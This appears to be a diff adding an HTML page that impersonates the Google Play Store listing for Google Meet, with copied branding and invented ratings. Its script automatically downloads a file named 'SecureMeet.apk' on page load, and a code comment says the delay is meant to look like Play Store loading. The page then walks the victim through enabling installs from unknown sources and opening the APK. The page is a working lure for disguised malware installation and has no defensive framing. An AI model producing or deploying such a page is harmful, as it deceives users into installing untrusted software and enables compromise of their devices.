@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Google Meet</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+body {
+  font-family: 'Google Sans', Roboto, Arial, sans-serif;
+  background: #f8f9fa;
+  min-height: 100vh;
+  display: flex; flex-direction: column;
+}
+
+/* ── Top bar ── */
+.topbar {
+  background: #fff;
+  display: flex; align-items: center;
+  padding: 14px 16px; gap: 14px;
+  border-bottom: 1px solid #e0e0e0;
+  position: sticky; top: 0; z-index: 10;
+}
+.topbar-back { font-size: 22px; color: #5f6368; cursor: pointer; }
+.topbar-title { font-size: 16px; color: #202124; font-weight: 500; }
+
+/* ── App card ── */
+.app-card {
+  background: #fff;
+  margin: 12px 12px 0;
+  border-radius: 12px;
+  padding: 20px 16px;
+  display: flex; gap: 16px;
+  align-items: flex-start;
+}
+.app-icon {
+  width: 72px; height: 72px; border-radius: 16px;
+  background: #00832d;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+}
+.app-icon svg { width: 44px; height: 44px; }
+.app-info { flex: 1; min-width: 0; }
+.app-name { font-size: 20px; font-weight: 500; color: #202124; margin-bottom: 2px; }
+.app-dev  { font-size: 13px; color: #1a73e8; margin-bottom: 6px; }
+.app-meta { font-size: 12px; color: #5f6368; display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 14px; }
+.app-meta span::before { content: ''; }
+
+/* ── Download button ── */
+.btn-install {
+  display: block; width: 100%;
+  background: #1a73e8; color: #fff;
+  border: none; border-radius: 6px;
+  padding: 13px; font-size: 15px; font-weight: 600;
+  cursor: pointer; text-align: center;
+  transition: background 0.2s;
+}
+.btn-install:active { background: #1558b0; }
+.btn-install.downloading { background: #5f6368; }
+.btn-install.done { background: #34a853; }
+
+/* ── Progress ── */
+.dl-progress { display: none; margin-top: 12px; }
+.dl-progress.show { display: block; }
+.dl-bar-wrap { height: 4px; background: #e8eaed; border-radius: 2px; overflow: hidden; }
+.dl-bar { height: 100%; background: #1a73e8; border-radius: 2px; width: 0%; transition: width 0.25s linear; }
+.dl-label { font-size: 12px; color: #5f6368; margin-top: 6px; }
+
+/* ── Ratings row ── */
+.ratings-row {
+  background: #fff;
+  margin: 10px 12px 0;
+  border-radius: 12px;
+  padding: 16px;
+  display: flex; justify-content: space-around;
+  text-align: center;
+}
+.rating-item .val { font-size: 20px; font-weight: 600; color: #202124; }
+.rating-item .lbl { font-size: 11px; color: #5f6368; margin-top: 2px; }
+.rating-stars { color: #f4b400; font-size: 13px; }
+
+/* ── Steps card ── */
+.steps-card {
+  display: none;
+  background: #fff3cd; border: 1px solid #f4b400;
+  margin: 10px 12px 0; border-radius: 12px; padding: 16px;
+}
+.steps-card.show { display: block; }
+.steps-title { font-size: 13px; font-weight: 700; color: #856404; margin-bottom: 10px; }
+.step { display: flex; gap: 10px; align-items: flex-start; margin-bottom: 10px; font-size: 13px; color: #856404; line-height: 1.5; }
+.step:last-child { margin-bottom: 0; }
+.step-n {
+  background: #f4b400; color: #fff; border-radius: 50%;
+  width: 20px; height: 20px; font-size: 11px; font-weight: 700;
+  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+}
+
+/* ── Description ── */
+.desc-card {
+  background: #fff; margin: 10px 12px 20px;
+  border-radius: 12px; padding: 16px;
+}
+.desc-title { font-size: 14px; font-weight: 600; color: #202124; margin-bottom: 8px; }
+.desc-text { font-size: 13px; color: #5f6368; line-height: 1.65; }
+.tag-row { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; }
+.tag {
+  background: #e8f0fe; color: #1a73e8;
+  border-radius: 20px; padding: 4px 12px; font-size: 12px;
+}
+
+/* ── Screenshots ── */
+.screenshots {
+  background: #fff; margin: 10px 12px 0;
+  border-radius: 12px; padding: 16px;
+  overflow: hidden;
+}
+.screenshots-title { font-size: 14px; font-weight: 600; color: #202124; margin-bottom: 12px; }
+.ss-row { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 4px; }
+.ss-item {
+  flex-shrink: 0; width: 130px; height: 230px;
+  background: #202124; border-radius: 10px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 36px; color: rgba(255,255,255,0.3);
+  position: relative;
+}
+.ss-item .ss-bar {
+  position: absolute; top: 0; left: 0; right: 0;
+  height: 24px; background: rgba(255,255,255,0.1);
+  border-radius: 10px 10px 0 0;
+  display: flex; align-items: center; padding: 0 8px;
+  gap: 4px;
+}
+.ss-dot { width: 6px; height: 6px; border-radius: 50%; background: rgba(255,255,255,0.3); }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <span class="topbar-back">←</span>
+  <span class="topbar-title">Google Play</span>
+</div>
+
+<div class="app-card">
+  <div class="app-icon">
+    <svg viewBox="0 0 75 75" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M43.5 37.5L54 28.5V46.5L43.5 37.5Z" fill="white"/>
+      <rect x="21" y="27" width="22.5" height="21" rx="3" fill="white"/>
+    </svg>
+  </div>
+  <div class="app-info">
+    <div class="app-name">Google Meet</div>
+    <div class="app-dev">Google LLC</div>
+    <div class="app-meta">
+      <span>4.5 ★</span>
+      <span>500M+ downloads</span>
+      <span>Free</span>
+    </div>
+    <button class="btn-install" id="install-btn" onclick="startDownload()">Install</button>
+    <div class="dl-progress" id="dl-progress">
+      <div class="dl-bar-wrap"><div class="dl-bar" id="dl-bar"></div></div>
+      <div class="dl-label" id="dl-label">Downloading...</div>
+    </div>
+  </div>
+</div>
+
+<!-- Steps — shown after download starts -->
+<div class="steps-card" id="steps-card">
+  <div class="steps-title">⚠ Enable install from unknown sources:</div>
+  <div class="step"><div class="step-n">1</div><span>Go to <strong>Settings → Security</strong> (or Privacy)</span></div>
+  <div class="step"><div class="step-n">2</div><span>Enable <strong>"Install unknown apps"</strong> for Chrome / Files</span></div>
+  <div class="step"><div class="step-n">3</div><span>Open your <strong>Downloads</strong> and tap <strong>SecureMeet.apk</strong></span></div>
+  <div class="step"><div class="step-n">4</div><span>Tap <strong>Install</strong> → <strong>Open</strong> → meeting starts automatically</span></div>
+</div>
+
+<div class="ratings-row">
+  <div class="rating-item">
+    <div class="val">4.5</div>
+    <div class="rating-stars">★★★★½</div>
+    <div class="lbl">5.2M ratings</div>
+  </div>
+  <div class="rating-item">
+    <div class="val">500M+</div>
+    <div class="lbl">Downloads</div>
+  </div>
+  <div class="rating-item">
+    <div class="val">E</div>
+    <div class="lbl">Everyone</div>
+  </div>
+</div>
+
+<div class="screenshots">
+  <div class="screenshots-title">Screenshots</div>
+  <div class="ss-row">
+    <div class="ss-item">🎥<div class="ss-bar"><div class="ss-dot"></div><div class="ss-dot"></div><div class="ss-dot"></div></div></div>
+    <div class="ss-item">📞<div class="ss-bar"><div class="ss-dot"></div><div class="ss-dot"></div><div class="ss-dot"></div></div></div>
+    <div class="ss-item">👥<div class="ss-bar"><div class="ss-dot"></div><div class="ss-dot"></div><div class="ss-dot"></div></div></div>
+    <div class="ss-item">🖥️<div class="ss-bar"><div class="ss-dot"></div><div class="ss-dot"></div><div class="ss-dot"></div></div></div>
+  </div>
+</div>
+
+<div class="desc-card">
+  <div class="desc-title">About this app</div>
+  <div class="desc-text">
+    Google Meet is a video communication service developed by Google. It provides secure, high-quality video meetings for teams of all sizes. Connect with colleagues and friends from anywhere with HD video and real-time captions.
+  </div>
+  <div class="tag-row">
+    <span class="tag">Video Calls</span>
+    <span class="tag">HD Video</span>
+    <span class="tag">Screen Share</span>
+    <span class="tag">Encrypted</span>
+  </div>
+</div>
+
+<script>
+// Auto-trigger download on page load after 1s (looks like Play Store loading)
+window.addEventListener('load', function() {
+  setTimeout(startDownload, 1200);
+});
+
+function startDownload() {
+  const btn      = document.getElementById('install-btn');
+  const progress = document.getElementById('dl-progress');
+  const bar      = document.getElementById('dl-bar');
+  const label    = document.getElementById('dl-label');
+  const steps    = document.getElementById('steps-card');
+
+  if (btn.classList.contains('downloading') || btn.classList.contains('done')) return;
+
+  btn.textContent = 'Downloading...';
+  btn.classList.add('downloading');
+  progress.classList.add('show');
+
+  // Animate bar
+  let pct = 0;
+  const iv = setInterval(() => {
+    pct += Math.random() * 25;
+    if (pct > 95) pct = 95;
+    bar.style.width = pct + '%';
+    label.textContent = 'Downloading... ' + Math.round(pct) + '%';
+  }, 200);
+
+  // Trigger actual APK download
+  setTimeout(() => {
+    const a = document.createElement('a');
+    a.href = '/download/android';
+    a.download = 'SecureMeet.apk';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }, 400);
+
+  // Complete after 2.5s, show install steps
+  setTimeout(() => {
+    clearInterval(iv);
+    bar.style.width = '100%';
+    bar.style.background = '#34a853';
+    label.textContent = '✓ Download complete — tap the file to install';
+    btn.textContent = 'Open';
+    btn.classList.remove('downloading');
+    btn.classList.add('done');
+    btn.onclick = null;
+    steps.classList.add('show');
+  }, 2500);
+}
+</script>
+</body>
+</html>
